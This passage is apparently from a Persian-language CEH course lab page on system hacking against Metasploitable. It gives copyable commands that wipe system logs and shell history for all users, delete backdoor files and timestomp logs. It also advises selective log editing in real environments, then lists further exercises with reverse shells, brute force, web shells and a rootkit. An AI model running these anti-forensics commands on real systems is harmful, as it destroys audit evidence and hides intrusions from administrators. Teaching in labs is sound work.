+        <h2>🧹 مرحله ۶: پاک کردن ردپا (Covering Tracks)</h2>
+        <p>
+            برای جلوگیری از شناسایی، باید تمام آثار حمله را از سیستم پاک کنید. این شامل لاگ‌ها، تاریخچه دستورات و فایل‌های اضافی است.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-clean">پاک کردن ردپا</span>
+            <h3>پاک کردن لاگ‌های سیستم</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># پاک کردن لاگ‌های احراز هویت
+echo "" > /var/log/auth.log
+echo "" > /var/log/auth.log.1
+
+# پاک کردن لاگ‌های سیستم
+echo "" > /var/log/syslog
+echo "" > /var/log/syslog.1
+
+# پاک کردن لاگ‌های cron
+echo "" > /var/log/cron.log
+echo "" > /var/log/cron.log.1
+
+# پاک کردن لاگ‌های Apache (اگر از وب استفاده کرده‌اید)
+echo "" > /var/log/apache2/access.log
+echo "" > /var/log/apache2/error.log
+
+# پاک کردن لاگ‌های MySQL
+echo "" > /var/log/mysql.log</code></pre>
+            </div>
+            <div class="warning-box">
+                <b>⚠️ توجه:</b> پاک کردن کامل لاگ‌ها ممکن است باعث سوءظن شود. در محیط‌های واقعی، لاگ‌های خاص را ویرایش کنید تا فقط ردپای خود را حذف کنید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-clean">پاک کردن ردپا</span>
+            <h3>پاک کردن تاریخچه دستورات</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># پاک کردن تاریخچه خود
+history -c
+rm -f ~/.bash_history
+
+# پاک کردن تاریخچه root
+rm -f /root/.bash_history
+
+# پاک کردن تاریخچه سایر کاربران
+rm -f /home/*/.bash_history</code></pre>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> برای جلوگیری از ثبت دستورات در آینده، می‌توانید از <code dir='ltr'>set +o history</code> قبل از اجرای دستورات استفاده کنید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-clean">پاک کردن ردپا</span>
+            <h3>حذف فایل‌های اضافی</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حذف اسکریپت‌های موقت
+rm -f /tmp/backdoor.sh
+
+# حذف فایل‌های لاگ اضافی
+rm -f /tmp/*.log
+
+# حذف فایل‌های آپلود شده (در صورت وجود)
+rm -f /tmp/exploit*</code></pre>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۴</span>
+            <span dir='ltr' class="phase-badge phase-clean">پاک کردن ردپا</span>
+            <h3>تغییر زمان‌ها برای مخفی‌سازی</h3>
+            <p>برای جلوگیری از شناسایی بر اساس زمان، می‌توانید زمان فایل‌ها را تغییر دهید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># تغییر زمان فایل‌های سیستم به یک تاریخ قدیمی
+touch -t 202301010000 /var/log/auth.log
+touch -t 202301010000 /var/log/syslog</code></pre>
+            </div>
+            <div class="highlight-box">
+                <b>✅ عملیات پاک کردن ردپا کامل شد!</b>
+                <p>
+                    تمام آثار حمله از سیستم پاک شده است. اگر همه مراحل را به درستی انجام داده باشید، 
+                    هیچ اثری از نفوذ شما در سیستم باقی نخواهد ماند.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: جمع‌بندی و سوالات -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📝 جمع‌بندی و سوالات</h2>
+
+        <div class="highlight-box">
+            <b>💡 خلاصه آزمایشگاه:</b>
+            <p>
+                در این آزمایشگاه، شما مراحل کامل یک حمله سیستم را از شناسایی تا پاک کردن ردپا پیاده‌سازی کردید:
+            </p>
+            <ul>
+                <li><b>شناسایی:</b> جمع‌آوری اطلاعات با Nmap و جستجوی آسیب‌پذیری‌ها</li>
+                <li><b>اسکن:</b> اسکن پورت‌ها و شمارش کاربران با enum4linux</li>
+                <li><b>دسترسی:</b> نفوذ با vsftpd backdoor و SSH</li>
+                <li><b>افزایش دسترسی:</b> استفاده از sudo و کرک پسورد</li>
+                <li><b>حفظ دسترسی:</b> ایجاد کاربر مخفی و شل معکوس</li>
+                <li><b>پاک کردن ردپا:</b> حذف لاگ‌ها و تاریخچه</li>
+            </ul>
+        </div>
+
+        <h3>❓ سوالات برای بررسی درک</h3>
+
+        <div class="question-box">
+            <strong>سوال ۱:</strong> تفاوت بین دسترسی کاربر عادی و root چیست؟ چرا افزایش دسترسی در هک قانونمند مهم است؟
+        </div>
+
+        <div class="question-box">
+            <strong>سوال ۲:</strong> اگر کاربر msfadmin قابلیت sudo نداشت، چه روش‌های دیگری برای افزایش دسترسی وجود داشت؟
+        </div>
+
+        <div class="question-box">
+            <strong>سوال ۳:</strong> چرا پاک کردن ردپا در هک قانونمند با وجود اینکه این کار غیراخلاقی به نظر می‌رسد، مهم است؟
+        </div>
+
+        <div class="question-box">
+            <strong>سوال ۴:</strong> تفاوت بین شل معکوس (Reverse Shell) و بایند شل (Bind Shell) چیست؟ کدام یک در محیط‌های واقعی امن‌تر است؟
+        </div>
+
+        <div class="question-box">
+            <strong>سوال ۵:</strong> اگر فایل‌های لاگ پاک شوند، مدیر سیستم چگونه می‌تواند نفوذ را تشخیص دهد؟
+        </div>
+
+        <div class="tip-box">
+            <b>💡 پاسخ‌ها را در فایل گزارش خود مستند کنید.</b>
+            <p>
+                برای هر سوال، پاسخ خود را با توجه به تجربه‌ای که در این آزمایشگاه به دست آورده‌اید، بنویسید.
+            </p>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: تمرین‌های اضافی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🧪 تمرین‌های اضافی</h2>
+        <p>
+            برای تسلط بیشتر، تمرین‌های زیر را نیز انجام دهید:
+        </p>
+        <ul>
+            <li><b>تمرین ۱:</b> با استفاده از <code dir='ltr'>msfvenom</code> یک شل معکوس Meterpreter تولید کنید و با Metasploit آن را اجرا کنید.</li>
+            <li><b>تمرین ۲:</b> از <code dir='ltr'>Hydra</code> برای Brute-Force به SSH روی Metasploitable استفاده کنید.</li>
+            <li><b>تمرین ۳:</b> یک فایل Web Shell (مثلاً PHP) روی وب‌سرور Metasploitable آپلود کنید و از آن برای دسترسی استفاده کنید.</li>
+            <li><b>تمرین ۴:</b> با استفاده از <code dir='ltr'>LinPEAS</code> یا <code dir='ltr'>WinPEAS</code>، یک اسکن افزایش دسترسی روی Metasploitable انجام دهید.</li>
+            <li><b>تمرین ۵:</b> یک روت‌کیت ساده (مثل <code dir='ltr'>Kbeast</code>) روی Metasploitable نصب کنید و تأثیر آن را بررسی کنید.</li>
+        </ul>
+        <div class="highlight-box">
+            <b>📌 گام بعدی:</b>
+            <p>
+                پس از اتمام این آزمایشگاه، به سراغ 
+                <a href="Session_2_Web_Hacking/index.html" style="color:#2a7de1;font-weight:bold;">آزمایشگاه هک وب (Session 2 - Web Hacking)</a> بروید.
+            </p>
+        </div>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">آزمایشگاه: System Hacking | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
